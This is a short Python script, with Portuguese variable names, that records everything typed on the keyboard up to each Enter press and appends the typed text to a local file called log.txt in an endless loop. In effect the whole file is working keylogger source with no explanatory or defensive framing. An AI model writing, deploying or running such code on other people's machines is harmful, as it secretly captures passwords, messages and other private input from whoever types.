import keyboard

while True:
    with open("log.txt", "a") as meu_arquivo:
        eventos = keyboard.record("enter")
        textos = list(keyboard.get_typed_strings(eventos))
        meu_arquivo.write(textos[0])
